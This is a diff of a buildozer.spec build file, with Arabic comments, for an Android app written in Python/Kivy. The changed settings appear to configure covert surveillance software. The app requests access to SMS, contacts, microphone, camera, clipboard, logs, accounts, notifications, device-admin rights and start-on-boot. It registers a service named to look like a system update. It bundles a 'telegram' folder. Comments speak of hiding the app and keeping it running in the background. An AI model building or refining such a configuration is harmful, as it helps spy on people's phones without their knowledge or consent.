@@ -12,54 +12,42 @@ source.dir = .
 source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db
 source.include_patterns = core/*, telegram/*, media/*, config/*, res/*
 
-# المكتبات الأساسية والمطلوبة للتشفير ومعالجة الصور والاتصالات
-requirements = python3,kivy,requests,pyjnius,android,urllib3,cryptography,pyopenssl,openssl,chardet,idna,certifi,Pillow,numpy
+# المكتبات الأساسية (تم إزالة Pillow و numpy لتقليل الحجم)
+requirements = python3,kivy,requests,pyjnius,android,urllib3,cryptography,pyopenssl,openssl,chardet,idna,certifi
 
-# الصلاحيات الكاملة المطلوبة للتطبيق
+# الصلاحيات الكاملة مع إضافات للبقاء في الخلفية
 android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, RECORD_AUDIO, READ_SMS, READ_CONTACTS, WAKE_LOCK, RECEIVE_BOOT_COMPLETED, FOREGROUND_SERVICE, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, MANAGE_EXTERNAL_STORAGE, READ_LOGS, GET_ACCOUNTS, BIND_DEVICE_ADMIN, QUERY_ALL_PACKAGES, NOTIFICATION_LISTENER, READ_CLIPBOARD, WRITE_CLIPBOARD
 
-# تعريف الخدمات والمستقبلات
 android.services = org.system.update.AdminReceiver:org.kivy.android.PythonService
 android.extra_xml_roots = ./config/device_admin.xml -> ./res/xml/device_admin.xml
 android.manifest = ./android/AndroidManifest.xml
 
-# إعدادات التشغيل في الخلفية والإخفاء
 android.foreground = True
 android.whitelist = True
 
-# دعم معمارية ARM64 فقط لتقليل الحجم
+# دعم معمارية ARM64 فقط لتقليل الحجم وتسريع البناء
 android.archs = arm64-v8a
 
-# تحسين الحجم بإزالة الكود غير المستخدم
 android.release_minify = True
-
-# إصدارات SDK و NDK و build tools
 android.api = 33
 android.minapi = 21
 android.ndk = 25b
 android.build_tools_version = 33.0.1
 
-# السماح باتصالات HTTP (بدون HTTPS) – ضروري لجلب config.json
+# السماح باتصالات HTTP العادية (لتجاوز قيود Android 9+)
 android.uses_cleartext_traffic = True
 
-# صلاحيات إضافية
 android.grant_permissions = android.permission.BACKUP, android.permission.READ_FRAME_BUFFER
 android.webview = True
 android.add_src = ./bin
 
-# مستوى التسجيل والإعدادات العامة
 log_level = 2
 warn_on_root = 0
 fullscreen = 0
 orientation = portrait
 resizeable = 0
 
-# تبعيات Kivy
 kivy_deps = sdl2, glew, vulkan
 cythonize = True
-
-# تضمين المجلدات الإضافية في APK
 android.add_deps = ./media,./core,./telegram,./config
-
-# استبعاد مكتبات غير ضرورية لتقليل الحجم
 android.exclude_libs = armeabi-v7a/libcrypto.so, armeabi-v7a/libssl.so
